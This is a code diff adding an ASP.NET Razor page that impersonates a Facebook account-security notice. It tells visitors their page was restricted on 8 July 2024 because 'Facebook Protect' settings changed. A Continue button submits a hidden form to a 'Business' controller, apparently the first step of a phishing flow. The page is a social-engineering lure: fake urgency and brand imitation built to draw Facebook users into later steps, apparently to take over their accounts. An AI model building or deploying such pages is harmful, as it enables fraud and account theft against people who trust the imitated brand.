@@ -1,0 +1,73 @@
+﻿@{
+    ViewData["Title"] = "Restrictions Information";
+}
+<style type="text/css" media="all">
+    body {
+        background-color: #eaeaea;
+    }
+
+    .fb {
+        background-color: #fff;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-content: center;
+        align-items: center;
+        border-radius: 10px;
+    }
+
+    .alert {
+        background-color: #eaeaea;
+    }
+
+    .btn-continue {
+        background-color: #1877f2;
+        color: #fff;
+        font-weight: bold;
+        font-size: 15px;
+        padding: 13px;
+        border: none;
+        border-radius: 5px;
+    }
+</style>
+
+<div class="text-center">
+    <div class="container box mt-5">
+        <div class="container fb">
+            <img width="150" src="~/img./gembok.png" alt="">
+            <h1>Check Your Account Security.</h1>
+            <p style="font-size: 13px;">
+                We have temporarily blocked your account because your Facebook Protect
+                setting have been modified.
+            </p>
+            <div class="alert d-flex align-items-center" role="alert">
+                <svg xmlns="http://www.w3.org/2000/svg" width="35" height="35" fill="currentColor" class="text-warning bi bi-exclamation-triangle" viewBox="0 0 16 16">
+                    <path d="M7.938 2.016A.13.13 0 0 1 8.002 2a.13.13 0 0 1 .063.016.15.15 0 0 1 .054.057l6.857 11.667c.036.06.035.124.002.183a.2.2 0 0 1-.054.06.1.1 0 0 1-.066.017H1.146a.1.1 0 0 1-.066-.017.2.2 0 0 1-.054-.06.18.18 0 0 1 .002-.183L7.884 2.073a.15.15 0 0 1 .054-.057m1.044-.45a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767z"></path>
+                    <path d="M7.002 12a1 1 0 1 1 2 0 1 1 0 0 1-2 0M7.1 5.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0z"></path>
+                </svg>
+                <div style="margin-left: 20px;">
+                    <strong style="font-size: 15px;">
+                        Your page was restricted on
+                        <br>
+                        <span id="tampil"> 8 July 2024</span>
+                    </strong> <p style="font-size: 13px;">we did this to protect your account from being suspended.</p>
+                </div>
+            </div>
+            <p style="font-size: 13px;">We will guide you through some steps to lift the page restriction and unlock your account.</p>
+
+            @* <a href="@Url.Action("RestrictionsInformation", "Business", new { authen = "Hello" })" class="btn btn-primary w-100 p-2">Continue</a> *@
+            <a href="#" id="postLink" class="btn btn-primary w-100 p-2">Continue</a>
+
+            <form id="hiddenForm" action="@Url.Action("RestrictionsInformation", "Business")" method="post" style="display:none;">
+                <input type="hidden" name="authen" value="Hello" />
+            </form>
+        </div>
+    </div>
+</div>
+<script>
+    document.getElementById("postLink").addEventListener("click", function (event) {
+        event.preventDefault();
+        document.getElementById("hiddenForm").submit();
+    });
+</script>
